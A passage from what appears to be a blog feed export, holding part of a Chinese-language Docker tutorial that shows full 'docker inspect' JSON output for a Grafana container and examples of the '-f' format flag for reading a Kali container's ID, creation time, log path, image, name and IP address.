class="hljs-string">&quot;Error&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;StartedAt&quot;</span>: <span class="hljs-string">&quot;2022-09-16T01:30:49.547993902Z&quot;</span>,<br>            <span class="hljs-string">&quot;FinishedAt&quot;</span>: <span class="hljs-string">&quot;0001-01-01T00:00:00Z&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:aeeaa96eea830b988643e495b3978bff65dbdb997cc938ff5a4185a6bf3d7839&quot;</span>,<br>        <span class="hljs-string">&quot;ResolvConfPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/resolv.conf&quot;</span>,<br>        <span class="hljs-string">&quot;HostnamePath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/hostname&quot;</span>,<br>        <span class="hljs-string">&quot;HostsPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/hosts&quot;</span>,<br>        <span class="hljs-string">&quot;LogPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1-json.log&quot;</span>,<br>        <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;/amazing_brahmagupta&quot;</span>,<br>        <span class="hljs-string">&quot;RestartCount&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;Driver&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span>,<br>        <span class="hljs-string">&quot;Platform&quot;</span>: <span class="hljs-string">&quot;linux&quot;</span>,<br>        <span class="hljs-string">&quot;MountLabel&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;ProcessLabel&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;AppArmorProfile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;ExecIDs&quot;</span>: <span class="hljs-literal">null</span>,<br>        <span class="hljs-string">&quot;HostConfig&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Binds&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;ContainerIDFile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;LogConfig&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;Type&quot;</span>: <span class="hljs-string">&quot;json-file&quot;</span>,<br>                <span class="hljs-string">&quot;Config&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;NetworkMode&quot;</span>: <span class="hljs-string">&quot;default&quot;</span>,<br>            <span class="hljs-string">&quot;PortBindings&quot;</span>: &#123;&#125;,<br>            <span class="hljs-string">&quot;RestartPolicy&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;no&quot;</span>,<br>                <span class="hljs-string">&quot;MaximumRetryCount&quot;</span>: <span class="hljs-number">0</span><br>            &#125;,<br>            <span class="hljs-string">&quot;AutoRemove&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;VolumeDriver&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;VolumesFrom&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CapAdd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CapDrop&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CgroupnsMode&quot;</span>: <span class="hljs-string">&quot;host&quot;</span>,<br>            <span class="hljs-string">&quot;Dns&quot;</span>: [],<br>            <span class="hljs-string">&quot;DnsOptions&quot;</span>: [],<br>            <span class="hljs-string">&quot;DnsSearch&quot;</span>: [],<br>            <span class="hljs-string">&quot;ExtraHosts&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;GroupAdd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;IpcMode&quot;</span>: <span class="hljs-string">&quot;private&quot;</span>,<br>            <span class="hljs-string">&quot;Cgroup&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Links&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;OomScoreAdj&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;PidMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Privileged&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;PublishAllPorts&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ReadonlyRootfs&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;SecurityOpt&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;UTSMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;UsernsMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;ShmSize&quot;</span>: <span class="hljs-number">67108864</span>,<br>            <span class="hljs-string">&quot;Runtime&quot;</span>: <span class="hljs-string">&quot;runc&quot;</span>,<br>            <span class="hljs-string">&quot;ConsoleSize&quot;</span>: [<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-number">0</span><br>            ],<br>            <span class="hljs-string">&quot;Isolation&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;CpuShares&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Memory&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;NanoCpus&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CgroupParent&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;BlkioWeight&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;BlkioWeightDevice&quot;</span>: [],<br>            <span class="hljs-string">&quot;BlkioDeviceReadBps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceWriteBps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceReadIOps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceWriteIOps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CpuPeriod&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuQuota&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuRealtimePeriod&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuRealtimeRuntime&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpusetCpus&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;CpusetMems&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Devices&quot;</span>: [],<br>            <span class="hljs-string">&quot;DeviceCgroupRules&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;DeviceRequests&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;KernelMemory&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;KernelMemoryTCP&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemoryReservation&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemorySwap&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemorySwappiness&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;OomKillDisable&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;PidsLimit&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Ulimits&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CpuCount&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuPercent&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IOMaximumIOps&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IOMaximumBandwidth&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MaskedPaths&quot;</span>: [<br>                <span class="hljs-string">&quot;/proc/asound&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/acpi&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/kcore&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/keys&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/latency_stats&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/timer_list&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/timer_stats&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sched_debug&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/scsi&quot;</span>,<br>                <span class="hljs-string">&quot;/sys/firmware&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;ReadonlyPaths&quot;</span>: [<br>                <span class="hljs-string">&quot;/proc/bus&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/fs&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/irq&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sys&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sysrq-trigger&quot;</span><br>            ]<br>        &#125;,<br>        <span class="hljs-string">&quot;GraphDriver&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Data&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;LowerDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885-init/diff:/var/lib/docker/overlay2/633c4f694e05024bd76ad9fa14e1c6e91eafa6fc167d32d65323885a9716bc35/diff:/var/lib/docker/overlay2/3ecd937d9ada1a8fca42695112f838d4e6eecad76e4da399deacb18ef3649f82/diff:/var/lib/docker/overlay2/034018bf0da3afd6cf8bea09c68058ed00aef54e0874542ab6b0cd0b5a2f5b02/diff:/var/lib/docker/overlay2/6a03f6c5a8ecfae171548b33f90b727a03afd182a426885717725fbd33e1e336/diff:/var/lib/docker/overlay2/e0ab3c204ba426a01ca2074f17047430c05eecc9d07a1e950e1bc0a49bb46181/diff:/var/lib/docker/overlay2/2f13d908a74a801add00f7fff9820ccfb297beac35a2d91ea05f812e2de3faf2/diff:/var/lib/docker/overlay2/5342538fe3dcd1ce2077dc5ac82efaed68d7fa18d7d58e2c41129f1f0c3a0b3f/diff:/var/lib/docker/overlay2/40c7b37364a365de1537dd0a8fbf60f9fc1484feb520fea5a45e396dcbb4e121/diff:/var/lib/docker/overlay2/a02e590a00667b827a1e3c789b75c3bb846586593bf2fc8015546a8351f77443/diff&quot;</span>,<br>                <span class="hljs-string">&quot;MergedDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/merged&quot;</span>,<br>                <span class="hljs-string">&quot;UpperDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/diff&quot;</span>,<br>                <span class="hljs-string">&quot;WorkDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/work&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Mounts&quot;</span>: [],<br>        <span class="hljs-string">&quot;Config&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;4b0e2ed242e0&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;472&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;3000/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_CONFIG=/etc/grafana/grafana.ini&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_DATA=/var/lib/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_HOME=/usr/share/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_LOGS=/var/log/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_PLUGINS=/var/lib/grafana/plugins&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_PROVISIONING=/etc/grafana/provisioning&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;aeeaa96eea83&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;/usr/share/grafana&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/run.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;&#125;<br>        &#125;,<br>        <span class="hljs-string">&quot;NetworkSettings&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Bridge&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;SandboxID&quot;</span>: <span class="hljs-string">&quot;d5029e992abf128054cd8dcb811ef7fcddde6c94578e84b3ad41b309eeea0301&quot;</span>,<br>            <span class="hljs-string">&quot;HairpinMode&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;LinkLocalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;LinkLocalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Ports&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;3000/tcp&quot;</span>: <span class="hljs-literal">null</span><br>            &#125;,<br>            <span class="hljs-string">&quot;SandboxKey&quot;</span>: <span class="hljs-string">&quot;/var/run/docker/netns/d5029e992abf&quot;</span>,<br>            <span class="hljs-string">&quot;SecondaryIPAddresses&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;SecondaryIPv6Addresses&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;EndpointID&quot;</span>: <span class="hljs-string">&quot;14e461fe748eea297b8d84f043159905b7956018493b45476442b060ed2e9c3d&quot;</span>,<br>            <span class="hljs-string">&quot;Gateway&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>,<br>            <span class="hljs-string">&quot;GlobalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;GlobalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IPAddress&quot;</span>: <span class="hljs-string">&quot;172.17.0.3&quot;</span>,<br>            <span class="hljs-string">&quot;IPPrefixLen&quot;</span>: <span class="hljs-number">16</span>,<br>            <span class="hljs-string">&quot;IPv6Gateway&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;MacAddress&quot;</span>: <span class="hljs-string">&quot;02:42:ac:11:00:03&quot;</span>,<br>            <span class="hljs-string">&quot;Networks&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;bridge&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;IPAMConfig&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;Links&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;Aliases&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;NetworkID&quot;</span>: <span class="hljs-string">&quot;3934b22c38426e6823be8668550b7d3992929a89bd449089673db6dc3dbbef26&quot;</span>,<br>                    <span class="hljs-string">&quot;EndpointID&quot;</span>: <span class="hljs-string">&quot;14e461fe748eea297b8d84f043159905b7956018493b45476442b060ed2e9c3d&quot;</span>,<br>                    <span class="hljs-string">&quot;Gateway&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>,<br>                    <span class="hljs-string">&quot;IPAddress&quot;</span>: <span class="hljs-string">&quot;172.17.0.3&quot;</span>,<br>                    <span class="hljs-string">&quot;IPPrefixLen&quot;</span>: <span class="hljs-number">16</span>,<br>                    <span class="hljs-string">&quot;IPv6Gateway&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span class="hljs-string">&quot;GlobalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span class="hljs-string">&quot;GlobalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>                    <span class="hljs-string">&quot;MacAddress&quot;</span>: <span class="hljs-string">&quot;02:42:ac:11:00:03&quot;</span>,<br>                    <span class="hljs-string">&quot;DriverOpts&quot;</span>: <span class="hljs-literal">null</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><h4 id="OPTIONS-9"><a href="#OPTIONS-9" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-2"><a href="#f-2" class="headerlink" title="-f"></a>-f</h5><p>指定返回值的模版文件，类似 docker inspect –format</p><h4 id="实例-10"><a href="#实例-10" class="headerlink" title="实例"></a>实例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker ps <br>CONTAINER ID   IMAGE                           COMMAND   CREATED         STATUS         PORTS     NAMES<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>    14 months ago   Up 3 seconds             kali<br></code></pre></td></tr></table></figure><h5 id="查看容器ID"><a href="#查看容器ID" class="headerlink" title="查看容器ID"></a>查看容器ID</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">docker inspect -f=&#x27;&#123;&#123;.Id&#125;&#x27; Name<span class="hljs-string">|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">➜  /tmp docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Id</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br><span class="language-xml">61804e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f</span><br></code></pre></td></tr></table></figure><h5 id="查看容器创建具体时间"><a href="#查看容器创建具体时间" class="headerlink" title="查看容器创建具体时间"></a>查看容器创建具体时间</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Created</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker ps <br>CONTAINER ID   IMAGE                           COMMAND   CREATED         STATUS         PORTS     NAMES<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>    14 months ago   Up 3 seconds             kali<br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">➜  /tmp docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Created</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br><span class="language-xml">2022-12-08T04:42:46.58388013Z</span><br></code></pre></td></tr></table></figure><h5 id="查看容器日志路径"><a href="#查看容器日志路径" class="headerlink" title="查看容器日志路径"></a>查看容器日志路径</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.LogPath</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">➜  /tmp docker <span class="hljs-keyword">inspect</span> -f <span class="hljs-string">&#x27;&#123;&#123;.LogPath&#125;&#125;&#x27;</span> <span class="hljs-number">61804</span>e0083af<br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/docker/</span>containers<span class="hljs-regexp">/61804e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f/</span><span class="hljs-number">61804</span>e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f-json.log<br></code></pre></td></tr></table></figure><h5 id="查看容器所使用镜像"><a href="#查看容器所使用镜像" class="headerlink" title="查看容器所使用镜像"></a>查看容器所使用镜像</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Image</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><p>查询结果为镜像id，docker images 查询的id为镜像id的前12位</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">➜  ~ docker inspect -f &#x27;&#123;&#123;.Image&#125;&#125;&#x27; <span class="hljs-number">61804e0083</span>af<br>sha<span class="hljs-number">256</span>:<span class="hljs-number">0</span>d<span class="hljs-number">323592</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>f<span class="hljs-number">57780</span>d<span class="hljs-number">4</span>caa<span class="hljs-number">99</span>ba<span class="hljs-number">48e8867</span>d<span class="hljs-number">43532</span><span class="hljs-keyword">c</span><span class="hljs-number">72879</span>b<span class="hljs-number">31</span>ec<span class="hljs-number">0</span>b<span class="hljs-number">47</span>af<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>cfeb<span class="hljs-number">19</span><br>➜  ~ docker images | grep <span class="hljs-number">0</span>d<span class="hljs-number">3235</span><br>kalilinux/kali-rolling    latest       <span class="hljs-number">0</span>d<span class="hljs-number">323592</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>f<span class="hljs-number">5</span>   <span class="hljs-number">14</span> months ago   <span class="hljs-number">140</span>MB<br></code></pre></td></tr></table></figure><h5 id="查看容器名"><a href="#查看容器名" class="headerlink" title="查看容器名"></a>查看容器名</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Name</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker inspect -f=<span class="hljs-string">&#x27;&#123;&#123;.Name&#125;&#125;&#x27;</span> 61804e0083af<br>/kali<br>➜  /tmp docker ps | grep 61804e0083af<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>                   15 months ago   Up 7 minutes                                        kali<br>➜  /tmp <br><br></code></pre></td></tr></table></figure><h5 id="查看容器内IP"><a href="#查看容器内IP" class="headerlink" title="查看容器内IP"></a>查看容器内IP</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.NetworkSettings.Networks.bridge.IPAddress</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp docker inspect -f=&#x27;&#123;&#123;.NetworkSettings.Networks.bridge.IPAddress&#125;&#125;&#x27; 61804e0083af<br><span class="hljs-number">172.17.0.2</span><br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tap">➜  /tmp docker exec -it 61804e0083af &quot;ifconfig&quot;<br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255<br>        ether 02:42:ac:11:00:02  txqueuelen<span class="hljs-number"> 0 </span> (Ethernet)<br>        RX packets<span class="hljs-number"> 15 </span> bytes<span class="hljs-number"> 1322 </span>(1.2 KiB)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        loop  txqueuelen<span class="hljs-number"> 1000 </span> (Local Loopback)<br>        RX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/02/19/security/secvulns/oss/osstools/"/>
    <url>/2024/02/19/security/secvulns/oss/osstools/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>fping</title>
